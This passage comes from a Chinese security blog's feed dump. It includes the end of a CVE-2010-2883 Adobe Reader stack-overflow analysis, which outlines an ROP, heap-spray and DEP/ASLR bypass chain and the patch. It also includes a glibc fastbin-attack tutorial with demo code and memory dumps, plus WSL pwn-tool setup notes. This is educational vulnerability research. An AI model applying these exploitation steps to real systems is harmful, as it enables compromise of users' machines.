src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084338943.png"></p><p>继续执行到此处，这里将要执行的ShellCode写入到MapViewOfFile返回的地址，因为这段内存是可读可写的，所以就绕过了DEP的保护由于构造的ROP链指令均位于不受ASLR保护的icucnv32.dll模块，因此也绕过了ASLR，之后执行shellcode。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084359980.png"></p><h2 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h2><p>1.获取SING表的入口地址</p><p>2.使用strcat函数将unique和ebp拼接造成溢出</p><p>3.将返回地址覆盖为0x4A82A714</p><p>4.之后调用0012E6D0(call命令之前eax的值)</p><p>5.调整ebp，跳回构造函数的返回地址0x4A82A714</p><p>6.修改esp为0x0C0C0C0C</p><p>7.利用JavaScript实现HeapSpray</p><p>8.利用ROP链执行CreateFileA</p><p>9.利用ROP链执行CreateFileMappingA，将文件映射到一块可读可写可执行的内存空间</p><p>10.利用ROP链执行memcpy将shellcode写入MapViewOfFile返回的地址，绕过DEP</p><p>11.执行shellcode</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载新版本AdobeReader提取CoolType.dll定位到相同的位置，就不再调用strcat函数了，替换的函数获取了字段的长度，并判断是否超出限制，如果超出限制就用strncat限制了拷贝的字节数。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin attach</title>
      <link href="/2021/08/02/fastbin%20attach/"/>
      <url>/2021/08/02/fastbin%20attach/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*    If the size qualifies as a fastbin, first check corresponding bin.    This code is safe to execute even if av is not yet initialized, so we    can try it without checking, which saves some time on this fast path.    */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 得到对应的fastbin的下标</span>    idx             <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 得到对应的fastbin的头指针</span>    mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>    mchunkptr    pp <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>    <span class="token comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        victim <span class="token operator">=</span> pp<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pp <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_acq</span><span class="token punctuation">(</span>fb<span class="token punctuation">,</span> victim<span class="token operator">-&gt;</span>fd<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表指针，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里是通过fd指针来获取下一个chunk的。所以如果可以控制某个fast bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在任意地方分配chunk的目的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 存在可以利用的chunk</span><span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span>    <span class="token comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span>    <span class="token comment">// 利用fastbin_index 计算 chunk 的索引。</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>    errout<span class="token operator">:</span>        <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还需要绕过检测，malloc会检查取到的chunk的size是否是符合这个fast bin，所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin使用单链表维护释放的堆块，由 fastbin 管理的 chunk 即使被释放，但next_chunk 的 prev_inuse 位也不会被清空</p><h2 id="fastbin单向链表储存结构"><a href="#fastbin单向链表储存结构" class="headerlink" title="fastbin单向链表储存结构"></a>fastbin单向链表储存结构</h2><p>fastbins的存储采用后进先出（LIFO）的原则：后free的chunk会被添加到先free的chunk的后面。同理，通过malloc取出chunk时是先去取最新放进去的因此，fastbins中的所有chunk的bk是没有用到的，因为是单链表。并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理</p><p><img src="/2021/08/02/fastbin%20attach/image-20250921191412402.png"></p><p>步骤一：被free的chunk会被放入到arena所管理的fastbins链中。如果此时我们malloc一个堆块p，并将其free到fastbin链中，但是我们的p指针没有置空，所以仍然指向于这个freechunk的fd成员处.</p><pre class="line-numbers language-none"><code class="language-none">char *p=malloc(size);free(p);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/02/fastbin%20attach/image-20250921191446089.png"></p><p>步骤二：释放之后，arena管理的fastbin中bin头的fd指针指向于我们申请的这个chunk，p指针就是chunk的fd,如上所示</p><p>步骤三：这个chunk的fd指针本来指向于数值0，此时我们通过p指针将fd指针指向于我们的target地址</p><pre class="line-numbers language-none"><code class="language-none">*p=target<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/fastbin%20attach/image-20250921191516371.png"></p><p>步骤四：malloc与我们释放的chunk相等大小的chunk，那么被上面被free掉的chunk就会从fastbin单链表中移除，根据fastbin链表的单链表结构，此时arena的fastbin的bin头的fd指针指向于我们的target地址了</p><pre class="line-numbers language-none"><code class="language-none">char *q=malloc(size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/fastbin%20attach/image-20250921191539319.png"></p><p>步骤五：由于此arena的fastbin的bin头的fd指针指向于我们的target地址了。此时我们再去malloc的时候，就是把target这块地址malloc出来给应用层使用了，此时我们就可以使用返回的target的指定地址，对target进行读写了</p><pre class="line-numbers language-none"><code class="language-none">char *r=malloc(size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unsitd.h&gt;int main(){    void *chunk1,*chunk2,*chunk3;    chunk1=malloc(0x30);    chunk2=malloc(0x30);    chunk3=malloc(0x30);    sleep(1);    free(chunk1);    free(chunk2);    free(chunk3);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="释放之前"><a href="#释放之前" class="headerlink" title="释放之前"></a>释放之前</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">0x602000:0x00000000000000000x0000000000000041 &lt;===chunk10x602010:0x00000000000000000x00000000000000000x602020:0x00000000000000000x00000000000000000x602030:0x00000000000000000x00000000000000000x602040:0x00000000000000000x0000000000000041 &lt;===chunk20x602050:0x00000000000000000x00000000000000000x602060:0x00000000000000000x00000000000000000x602070:0x00000000000000000x00000000000000000x602080:0x00000000000000000x0000000000000041 &lt;===chunk30x602090:0x00000000000000000x00000000000000000x6020a0:0x00000000000000000x00000000000000000x6020b0:0x00000000000000000x00000000000000000x6020c0:0x00000000000000000x0000000000020f41 &lt;===top chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还没有释放，bins链为空</p><p><img src="/2021/08/02/fastbin%20attach/image-20250921191710169.png"></p><h3 id="释放chunk1"><a href="#释放chunk1" class="headerlink" title="释放chunk1"></a>释放chunk1</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">0x602000:0x00000000000000000x0000000000000041 &lt;===chunk10x602010:0x00000000000000000x00000000000000000x602020:0x00000000000000000x00000000000000000x602030:0x00000000000000000x00000000000000000x602040:0x00000000000000000x0000000000000041 &lt;===chunk20x602050:0x00000000000000000x00000000000000000x602060:0x00000000000000000x00000000000000000x602070:0x00000000000000000x00000000000000000x602080:0x00000000000000000x0000000000000041 &lt;===chunk30x602090:0x00000000000000000x00000000000000000x6020a0:0x00000000000000000x00000000000000000x6020b0:0x00000000000000000x00000000000000000x6020c0:0x00000000000000000x0000000000020f41 &lt;===top chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个fastbin链第一个chunk指向于一个特殊的“0”</p><p><img src="/2021/08/02/fastbin%20attach/image-20250921191757369.png"></p><h3 id="释放chunk2后"><a href="#释放chunk2后" class="headerlink" title="释放chunk2后"></a>释放chunk2后</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x602000</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000041</span> <span class="token operator">&lt;=</span><span class="token operator">==</span>chunk1<span class="token number">0x602010</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602020</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602040</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000041</span> <span class="token operator">&lt;=</span><span class="token operator">==</span>chunk2<span class="token number">0x602050</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602060</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602070</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x602080</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000041</span> <span class="token operator">&lt;=</span><span class="token operator">==</span>chunk3<span class="token number">0x602090</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x6020a0</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x6020b0</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000000000</span><span class="token number">0x6020c0</span><span class="token operator">:</span><span class="token number">0x0000000000000000</span><span class="token number">0x0000000000020f41</span> <span class="token operator">&lt;=</span><span class="token operator">==</span>top chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放chunk1然后再释放chunk2，并且查看bins信息（可以看到两个chunkfree之后直接存储在fastbins的0x40bin链上），并且chunk2的fd指针指向前一个chunk的chunk头处，第一个chunk的fd指向的是特殊的0</p><h3 id="释放chunk3后"><a href="#释放chunk3后" class="headerlink" title="释放chunk3后"></a>释放chunk3后</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">0x602000:0x00000000000000000x0000000000000041 &lt;===chunk10x602010:0x00000000000000000x00000000000000000x602020:0x00000000000000000x00000000000000000x602030:0x00000000000000000x00000000000000000x602040:0x00000000000000000x0000000000000041 &lt;===chunk20x602050:0x00000000000000000x00000000000000000x602060:0x00000000000000000x00000000000000000x602070:0x00000000000000000x00000000000000000x602080:0x00000000000000000x0000000000000041 &lt;===chunk30x602090:0x00000000000000000x00000000000000000x6020a0:0x00000000000000000x00000000000000000x6020b0:0x00000000000000000x00000000000000000x6020c0:0x00000000000000000x0000000000020f41 &lt;===top chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>chunk3的fd指向chunk2,chunk2的fd指向chunk1，chunk1做为fastbin链的第一个指向特殊的“0”</p><p><img src="/2021/08/02/fastbin%20attach/image-20250921191908047.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastbin attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL相关</title>
      <link href="/2020/09/21/WSL%E7%9B%B8%E5%85%B3/"/>
      <url>/2020/09/21/WSL%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="wsl相关"><a href="#wsl相关" class="headerlink" title="wsl相关"></a>wsl相关</h2><h3 id="wsl改位置"><a href="#wsl改位置" class="headerlink" title="wsl改位置"></a>wsl改位置</h3><pre class="line-numbers language-none"><code class="language-none">首先查看所有分发版本wsl -l --all  -v导出分发版为tar文件到d盘wsl --export Ubuntu-20.04 d:\ubuntu20.04.tar注销当前分发版wsl --unregister Ubuntu-20.04重新导入并安装分发版在d:ubuntuwsl --import Ubuntu-20.04 d:\ubuntu d:\ubuntu20.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu2004 config --default-user Username删除tar文件(可选)del d:\ubuntu20.04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><pre class="line-numbers language-none"><code class="language-none">wsl --listwsl --unregister Ubuntuwsl --list --online<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><pre class="line-numbers language-none"><code class="language-none">做快照wsl --export Ubuntu-18.04 d:\WslDir\wsl-ubuntu18.04.tar注销当前系统wsl --unregister Ubuntu-18.04回滚wsl --import Ubuntu-18.04 d:\WslSys d:\WslDir\wsl-ubuntu18.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu1804 config --default-user Username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><pre class="line-numbers language-none"><code class="language-none">wsl --shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="wsl装ubuntu16"><a href="#wsl装ubuntu16" class="headerlink" title="wsl装ubuntu16"></a>wsl装ubuntu16</h2><p><a href="https://www.microsoft.com/store/productId/9PJN388HP8C9">https://www.microsoft.com/store/productId/9PJN388HP8C9</a></p><p>Invoke-WebRequest -Uri <a href="https://aka.ms/wsl-ubuntu-1604">https://aka.ms/wsl-ubuntu-1604</a> -OutFile Ubuntu.appx -UseBasicParsing</p><p>Add-AppxPackage .\Ubuntu.appx</p><h3 id="改位置"><a href="#改位置" class="headerlink" title="改位置"></a>改位置</h3><pre class="line-numbers language-none"><code class="language-none">首先查看所有分发版本wsl -l --all  -v导出分发版为tar文件到d盘wsl --export Ubuntu-16.04 E:\WSL\ubuntu16.04.tar注销当前分发版wsl --unregister Ubuntu-16.04重新导入并安装分发版在d:ubuntuwsl --import Ubuntu-16.04 E:\WSL\ubuntu16.04 E:\WSL\ubuntu16.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu1604 config --default-user Username删除tar文件(可选)del E:\WSL\ubuntu16.04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><pre class="line-numbers language-none"><code class="language-none">sudo cp /etc/apt/sources.list /etc/apt/sources_init.listsudo vim /etc/apt/sources.list清华deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricteddeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricteddeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial universedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates universedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial multiversedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates multiversedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricteddeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security universedeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security multiverse阿里deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse sudo apt-get updatecpsudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python3-pip3"><a href="#python3-pip3" class="headerlink" title="python3 pip3"></a>python3 pip3</h3><p><a href="https://www.python.org/ftp/python/">https://www.python.org/ftp/python/</a></p><p><a href="https://bootstrap.pypa.io/pip/">https://bootstrap.pypa.io/pip/</a></p><p>pythpip3版本为3.5,换其他版本python3</p><pre class="line-numbers language-none"><code class="language-none">sudo wget --no-check-certificate https://www.python.org/ftp/python/3.9.12/Python-3.9.12.tgzsudo tar -xzvf Python-3.9.12.tgzcd Python-3.9.12sudo mkdir -p /usr/local/python3sudo ./configure --prefix=/usr/local/python3 --enable-optimizationssudo makesudo make installsudo apt-get install build-essential(如果报错执行)sudo cp /usr/bin/python3 /usr/bin/python3_bak sudo rm /usr/bin/python3 sudo ln -s /usr/local/python3/bin/python3.9 /usr/bin/python3python3 -Vsudo ln -s /usr/local/python3/bin/pip3.9 /usr/bin/pip3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python2-pip2"><a href="#python2-pip2" class="headerlink" title="python2 pip2"></a>python2 pip2</h3><pre class="line-numbers language-none"><code class="language-none">sudo wget --no-check-certificate https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgzsudo tar -xzvf Python-2.7.18.tgzcd Python-2.7.18sudo mkdir -p /usr/local/python2sudo ./configure --prefix=/usr/local/python2 --enable-optimizationssudo makesudo make installsudo apt-get install build-essential(如果报错执行)sudo cp /usr/bin/python2 /usr/bin/python2_bak sudo rm /usr/bin/python2sudo ln -s /usr/local/python2/bin/python2.7 /usr/bin/python2python2 -Vcurl  https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.pypython2 get-pip.py --force-reinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CalledProcessError: Command ‘(‘lsb_release’, ‘-a’)’ returned non-zero exit status 1</p><pre class="line-numbers language-none"><code class="language-none">catsudo vi /usr/bin/lsb_release将第一行中的python3改为python3.5，因为之前的python3是指向python3.5的，让它使用原来的解释器即可sudo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p><a href="https://ftp.gnu.org/gnu/gdb/">https://ftp.gnu.org/gnu/gdb/</a></p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get remove gdbsudo apt-get purge gdbsudo apt-get install gdb python3.7-dbgtar -xvf gdb-x.x.tar.gzcd gdb-x.xsudo ./configure --with-python=pythonx.xmakesudo make installsudo apt-get install libmpfr-devsudo apt-get install libgmp-devexport GMP_LIB=/path/to/gmp/libraryexport GMP_INCLUDE=/path/to/gmp/include<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解释器版本</p><pre class="line-numbers language-none"><code class="language-none">gdb&gt;import sys&gt;print(sys.version)&gt;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解释器可执行文件</p><pre class="line-numbers language-none"><code class="language-none">gdb&gt;import sys&gt;print(sys.executable)&gt;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="apt-file"><a href="#apt-file" class="headerlink" title="apt-file"></a>apt-file</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt-get updatesudo apt-get install apt-filesudo apt-file updateapt-file search python3.9-dbgsudo apt-get install &lt;package-name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><pre class="line-numbers language-none"><code class="language-none">cd ~/git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="配置32位环境"><a href="#配置32位环境" class="headerlink" title="配置32位环境"></a>配置32位环境</h3><pre class="line-numbers language-none"><code class="language-none">sudo dpkg --add-architecture i386sudo apt-get updatesudo apt install build-essentialsudo apt install gcc-multilib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h3><pre class="line-numbers language-none"><code class="language-none">sudo pip3 install LibcSearchersudo pip3 install -U LibcSearcher<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pwngdb、peda、gef一键部署"><a href="#pwngdb、peda、gef一键部署" class="headerlink" title="pwngdb、peda、gef一键部署"></a>pwngdb、peda、gef一键部署</h3><pre class="line-numbers language-none"><code class="language-none"># https://github.com/apogiatzis/gdb-peda-pwndbg-gef# https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8cd ~ &amp;&amp; git clone https://github.com/apogiatzis/gdb-peda-pwndbg-gef.gitcd ~/gdb-peda-pwndbg-gef./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><pre class="line-numbers language-none"><code class="language-none">sudo pip3 install ropper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo python3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="wsl-ubuntu18-04"><a href="#wsl-ubuntu18-04" class="headerlink" title="wsl ubuntu18.04"></a>wsl ubuntu18.04</h2><h3 id="wsl改位置-1"><a href="#wsl改位置-1" class="headerlink" title="wsl改位置"></a>wsl改位置</h3><pre class="line-numbers language-none"><code class="language-none">首先查看所有分发版本wsl -l --all  -v导出分发版为tar文件到d盘wsl --export Ubuntu-18.04 E:\WSL\ubuntu18.04.tar注销当前分发版wsl --unregister Ubuntu-18.04重新导入并安装分发版在d:ubuntuwsl --import Ubuntu-18.04 E:\WSL\ubuntu18.04 E:\WSL\ubuntu18.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu1804 config --default-user Username删除tar文件(可选)del E:\WSL\ubuntu18.04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="换源-1"><a href="#换源-1" class="headerlink" title="换源"></a>换源</h3><pre class="line-numbers language-none"><code class="language-none">sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo vi /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversesudo apt updatesudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python-pip"><a href="#python-pip" class="headerlink" title="python pip"></a>python pip</h3><p>默认版本：Python 3.6.9 </p><p>卸载</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get remove python3.6 sudo apt-get autocleanpython3.6 --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python2sudo apt install pythonpip2 sudo apt install python-pippython3sudo apt install python3.7-minimalpip3sudo apt install python3-pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nice</p><pre class="line-numbers language-none"><code class="language-none">ubuntu18@DESKTOP-138M681:/usr/bin$ python -VPython 2.7.17ubuntu18@DESKTOP-138M681:/usr/bin$ python2 -VPython 2.7.17ubuntu18@DESKTOP-138M681:/usr/bin$ python3 -VPython 3.7.5ubuntu18@DESKTOP-138M681:/usr/bin$ pip -Vpip 9.0.1 from /usr/lib/python2.7/dist-packages (python 2.7)ubuntu18@DESKTOP-138M681:/usr/bin$ pip2 -Vpip 